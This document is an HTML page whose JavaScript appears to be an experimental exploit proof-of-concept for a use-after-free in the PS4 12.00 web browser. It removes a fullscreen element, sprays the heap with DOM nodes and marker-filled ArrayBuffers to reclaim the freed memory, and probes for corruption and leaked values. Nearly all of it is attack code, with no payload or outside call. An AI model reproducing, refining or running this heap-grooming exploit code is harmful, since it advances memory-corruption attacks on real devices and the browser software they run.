<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>PS4 12.00 - UAF Heap Overlap (Fixed Timing)</title>
</head>
<body style="background:#111;color:#0f0;font-family:monospace;">

<h2>UAF → Heap Overlap (Timing Fix)</h2>
<button onclick="runTest()">Run Test</button>

<script>

// ==========================
// 🔒 LOG
// ==========================
let logBuffer = [];
function log(msg){
    try{console.log(msg);}catch(e){}
    logBuffer.push(msg);
}

// ==========================
// HEAP SETUP
// ==========================
function setupHeap(){
    for(let i=0;i<5000;i++){
        let t=new Float64Array(8);
        t[0]=i;
    }
}

// ==========================
// FULLSCREEN
// ==========================
function setupFullscreen(){
    let fsTarget=document.createElement("div");

    fsTarget.innerHTML =
        "<h1 style='margin-top:20%;text-align:center;'>FULLSCREEN ACTIVE<br>Press OPTIONS</h1>";

    Object.assign(fsTarget.style,{
        background:"black",
        width:"100%",
        height:"100%",
        position:"absolute",
        top:"0",
        left:"0"
    });

    document.body.appendChild(fsTarget);
    fsTarget.webkitRequestFullscreen?.();

    return fsTarget;
}

// ==========================
// 💣 RECLAIM
// ==========================
function preciseReclaim(size){
    log("[*] Reclaim size = "+size);

    let bucket=[];

    for(let i=0;i<3000;i++){
        let el=document.createElement("div");
        document.body.appendChild(el);
        el.remove();
    }

    for(let i=0;i<size;i++){

        let el;

        if(i % 10 !== 0){
            el=document.createElement("div");

            el.innerHTML =
                "<h1 style='margin-top:20%;text-align:center;'>CTRL_"+i+
                "_41414141_42424242_43434343<br>Press OPTIONS</h1>";
        }
        else{
            el=document.createTextNode("TXT_"+i+"_BBBB");
            document.body.appendChild(el);
            bucket.push(el);
            continue;
        }

        Object.assign(el.style,{
            background:"black",
            width:"100%",
            height:"100%",
            position:"absolute",
            top:"0",
            left:"0"
        });

        document.body.appendChild(el);
        bucket.push(el);
    }

    return bucket;
}

// ==========================
// 🔥 ARRAYBUFFER SPRAY
// ==========================
let buffers=[];

function sprayArrayBuffers(count){

    buffers=[];

    for(let i=0;i<count;i++){

        let buf=new ArrayBuffer(0x40); // 🔥 tamanho ajustado
        let view=new Uint32Array(buf);

        view[0]=0x41414141;
        view[1]=0x42424242;
        view[2]=0x43434343;

        buffers.push(view);
    }

    log("[*] ArrayBuffer spray = "+buffers.length);
}

// ==========================
// 🔬 PROBE
// ==========================
function deepProbe(fsTarget){

    log("---- PROBE ----");

    try{
        let html=fsTarget.innerHTML;
        let txt=fsTarget.textContent;

        log("[CHECK] innerHTML = "+html);
        log("[CHECK] textContent = "+txt);

        if(html!==txt){
            log("[!!!] DESYNC DETECTADO");
        }

    }catch(e){
        log("[ERR] DOM read");
    }

    try{
        let child=fsTarget.firstChild;

        log("[CHECK] child = "+child);

        if(child){
            let v=child.nodeValue || child.textContent;
            log("[LEAK?] child data = "+v);

            if(v && v.includes("41414141")){
                log("[!!!] LEAK VIA CHILD");
            }
        }

    }catch(e){
        log("[ERR] child crash");
    }

    try{
        fsTarget.innerHTML="<div>BBBBBBBB</div>";
        log("[PWN] write OK");

        let after=fsTarget.innerHTML;
        log("[CHECK] after write = "+after);

        if(!after.includes("BBBB")){
            log("[!!!] WRITE DESYNC");
        }

    }catch(e){
        log("[PWN] write crash");
    }

    // ======================
    // 🔥 ARRAYBUFFER CHECK
    // ======================
    try{

        for(let i=0;i<buffers.length;i++){

            let v=buffers[i];

            if(
                v[0]!==0x41414141 ||
                v[1]!==0x42424242 ||
                v[2]!==0x43434343
            ){
                log("[!!!] CORRUPÇÃO FORTE buffer "+i);
                log(
                    v[0].toString(16)+","+
                    v[1].toString(16)+","+
                    v[2].toString(16)
                );
                break;
            }

            if(v[3]!==0){
                log("[!!!] POSSIVEL LEAK REAL");
                log("[VAL3] "+v[3].toString(16));
                break;
            }
        }

    }catch(e){
        log("[CRASH] buffer read");
    }

    try{
        log("[CHECK] parent = "+fsTarget.parentNode);
    }catch(e){}

    try{
        let r=fsTarget.getBoundingClientRect();
        log("[CHECK] rect = "+r.height);
    }catch(e){
        log("[UAF] rect crash");
    }
}

// ==========================
// 💥 TRIGGER (CORRIGIDO)
// ==========================
function trigger(fsTarget){

    log("[*] Trigger");

    try{
        fsTarget.remove();

        if(document.webkitIsFullScreen || document.fullscreenElement){
            document.webkitExitFullscreen?.();
        }

    }catch(e){}

    // 🔥 ORDEM CORRETA

    // 1. abrir slot (DOM)
    setTimeout(()=>preciseReclaim(2000), 0);
    setTimeout(()=>preciseReclaim(2200), 40);

    // 2. ocupar com heap real
    setTimeout(()=>sprayArrayBuffers(4000), 80);

    // 3. mistura final
    setTimeout(()=>preciseReclaim(2500), 120);

    // probes
    setTimeout(()=>deepProbe(fsTarget), 60);
    setTimeout(()=>deepProbe(fsTarget), 140);
    setTimeout(()=>deepProbe(fsTarget), 220);

    // log final
    setTimeout(()=>{
        alert(logBuffer.join("\n"));
    },400);

    setTimeout(()=>location.reload(),600);
}

// ==========================
// MAIN
// ==========================
function runTest(){

    log("[*] Iniciando teste");

    setupHeap();

    let fsTarget=setupFullscreen();

    window.onblur=function(){
        log("[*] onblur");
        setTimeout(()=>trigger(fsTarget),3000);
    };
}

</script>

</body>
</html>
